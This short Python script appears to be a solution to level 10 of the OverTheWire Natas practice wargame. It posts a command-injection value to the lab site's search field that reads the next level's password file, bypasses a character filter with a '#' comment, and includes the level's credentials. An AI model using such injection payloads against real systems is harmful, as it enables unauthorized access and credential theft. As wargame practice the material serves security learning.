#!/usr/bin/env python
# COMMAND INJECTION 2
import requests
import re

username='natas10'
password='nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

#cookie = { "loggedin" : "1" }
url = 'http://%s.natas.labs.overthewire.org/' %username
#session = requests.Session()
path = 'index-source.html'
# response = requests.get(url, auth = (username, password))
response = requests.post(url, data={'needle':'. /etc/natas_webpass/natas11 #', 'submit':'submit'}, auth = (username, password)) #Now they have started to block characters like [;|&], so we use '#' which comments out anything after that
content = response.text

# print content

print re.findall('<pre>\n(.*)\n</pre>', content)[0]
